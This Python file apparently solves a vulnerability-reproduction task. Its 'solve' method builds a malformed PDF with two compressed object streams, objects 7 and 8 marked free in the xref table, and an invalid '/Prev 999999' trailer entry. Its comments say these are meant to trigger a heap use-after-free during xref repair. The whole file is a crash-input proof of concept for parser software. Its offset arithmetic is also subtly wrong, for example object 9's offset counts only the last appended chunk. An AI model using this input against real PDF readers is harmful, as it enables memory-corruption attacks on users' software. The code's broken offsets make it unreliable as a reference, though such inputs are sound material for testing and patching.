import os
import tempfile
import subprocess
import struct
import zlib
import random
import string

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a PDF that triggers heap use-after-free in xref handling
        # by creating specific conditions for object stream loading and
        # xref solidification/repair
        
        pdf_parts = []
        
        # PDF header
        pdf_parts.append(b"%PDF-1.7\n")
        
        # Create objects that will be in object stream
        obj_stream_data = []
        obj_stream_offsets = []
        
        # Object 1: Catalog
        catalog_obj = b"<<\n/Type /Catalog\n/Pages 2 0 R\n>>"
        obj_stream_data.append(catalog_obj)
        obj_stream_offsets.append((1, 0))  # obj 1 at offset 0
        
        # Object 2: Pages
        pages_obj = b"<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>"
        obj_stream_data.append(pages_obj)
        obj_stream_offsets.append((2, len(catalog_obj)))
        
        # Object 3: Page
        page_obj = b"<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n/Resources <<\n/Font <<\n/F1 5 0 R\n>>\n>>\n>>"
        obj_stream_data.append(page_obj)
        obj_stream_offsets.append((3, len(catalog_obj) + len(pages_obj)))
        
        # Object 4: Content stream
        content_obj = b"BT\n/F1 12 Tf\n72 720 Td\n(Test) Tj\nET"
        obj_stream_data.append(content_obj)
        obj_stream_offsets.append((4, len(catalog_obj) + len(pages_obj) + len(page_obj)))
        
        # Object 5: Font
        font_obj = b"<<\n/Type /Font\n/Subtype /Type1\n/BaseFont /Helvetica\n/Encoding /WinAnsiEncoding\n>>"
        obj_stream_data.append(font_obj)
        obj_stream_offsets.append((5, len(catalog_obj) + len(pages_obj) + len(page_obj) + len(content_obj)))
        
        # Build object stream (obj 6)
        obj_stream_content = b""
        for obj_num, offset in obj_stream_offsets:
            obj_stream_content += f"{obj_num} {offset} ".encode()
        obj_stream_content += b"\n"
        for obj in obj_stream_data:
            obj_stream_content += obj + b"\n"
        
        # Compress object stream
        compressed_stream = zlib.compress(obj_stream_content)
        
        # Object 6: Object stream
        obj_stream_dict = b"<<\n/Type /ObjStm\n/N 5\n/First " + str(len(obj_stream_content.split(b"\n")[0]) + 1).encode() + b"\n/Length " + str(len(compressed_stream)).encode() + b"\n/Filter /FlateDecode\n>>"
        
        # Write objects before the object stream
        offset1 = len(pdf_parts[0])
        pdf_parts.append(f"1 0 obj\n{catalog_obj.decode()}\nendobj\n".encode())
        
        offset2 = offset1 + len(pdf_parts[-1])
        pdf_parts.append(f"2 0 obj\n{pages_obj.decode()}\nendobj\n".encode())
        
        offset3 = offset2 + len(pdf_parts[-1])
        pdf_parts.append(f"3 0 obj\n{page_obj.decode()}\nendobj\n".encode())
        
        offset4 = offset3 + len(pdf_parts[-1])
        pdf_parts.append(f"4 0 obj\n{content_obj.decode()}\nendobj\n".encode())
        
        offset5 = offset4 + len(pdf_parts[-1])
        pdf_parts.append(f"5 0 obj\n{font_obj.decode()}\nendobj\n".encode())
        
        # Write object stream (obj 6)
        offset6 = offset5 + len(pdf_parts[-1])
        pdf_parts.append(b"6 0 obj\n")
        pdf_parts.append(obj_stream_dict)
        pdf_parts.append(b"\nstream\n")
        pdf_parts.append(compressed_stream)
        pdf_parts.append(b"\nendstream\nendobj\n")
        
        # Create a second object stream that will trigger the vulnerability
        # This object stream contains references to objects in the first object stream
        second_stream_objs = []
        second_stream_offsets = []
        
        # Object 7: Indirect reference to force object stream loading
        ref_obj = b"<<\n/Ref 1 0 R\n/Type /Reference\n>>"
        second_stream_objs.append(ref_obj)
        second_stream_offsets.append((7, 0))
        
        # Object 8: Another reference
        ref_obj2 = b"<<\n/Ref 2 0 R\n/Type /Reference\n>>"
        second_stream_objs.append(ref_obj2)
        second_stream_offsets.append((8, len(ref_obj)))
        
        # Build second object stream
        second_stream_content = b""
        for obj_num, offset in second_stream_offsets:
            second_stream_content += f"{obj_num} {offset} ".encode()
        second_stream_content += b"\n"
        for obj in second_stream_objs:
            second_stream_content += obj + b"\n"
        
        # Compress second object stream
        compressed_second_stream = zlib.compress(second_stream_content)
        
        # Object 9: Second object stream
        obj_stream_dict2 = b"<<\n/Type /ObjStm\n/N 2\n/First " + str(len(second_stream_content.split(b"\n")[0]) + 1).encode() + b"\n/Length " + str(len(compressed_second_stream)).encode() + b"\n/Filter /FlateDecode\n>>"
        
        # Write second object stream
        offset9 = offset6 + len(pdf_parts[-1])
        pdf_parts.append(b"9 0 obj\n")
        pdf_parts.append(obj_stream_dict2)
        pdf_parts.append(b"\nstream\n")
        pdf_parts.append(compressed_second_stream)
        pdf_parts.append(b"\nendstream\nendobj\n")
        
        # Create malformed xref that will trigger repair/solidification
        # The vulnerability is triggered when xref entries are accessed
        # after being freed during solidification
        
        # Write a traditional xref table first
        xref_offset = offset9 + len(pdf_parts[-1])
        pdf_parts.append(b"xref\n")
        pdf_parts.append(b"0 10\n")
        pdf_parts.append(b"0000000000 65535 f \n")  # free object 0
        pdf_parts.append(f"{offset1:010d} 00000 n \n".encode())
        pdf_parts.append(f"{offset2:010d} 00000 n \n".encode())
        pdf_parts.append(f"{offset3:010d} 00000 n \n".encode())
        pdf_parts.append(f"{offset4:010d} 00000 n \n".encode())
        pdf_parts.append(f"{offset5:010d} 00000 n \n".encode())
        pdf_parts.append(f"{offset6:010d} 00000 n \n".encode())
        pdf_parts.append(b"0000000000 00000 f \n")  # free object 7 - will be repaired
        pdf_parts.append(b"0000000000 00000 f \n")  # free object 8 - will be repaired
        pdf_parts.append(f"{offset9:010d} 00000 n \n".encode())
        
        # Trailer
        pdf_parts.append(b"trailer\n")
        pdf_parts.append(b"<<\n")
        pdf_parts.append(b"/Size 10\n")
        pdf_parts.append(b"/Root 1 0 R\n")
        pdf_parts.append(b"/Info <<\n/CreationDate (D:20230101000000)\n/Producer (Test)\n>>\n")
        # Deliberately malformed /Prev to force xref repair
        pdf_parts.append(b"/Prev 999999\n")  # Invalid offset to trigger repair
        pdf_parts.append(b">>\n")
        
        # Startxref
        pdf_parts.append(b"startxref\n")
        pdf_parts.append(f"{xref_offset}\n".encode())
        pdf_parts.append(b"%%EOF")
        
        return b"".join(pdf_parts)
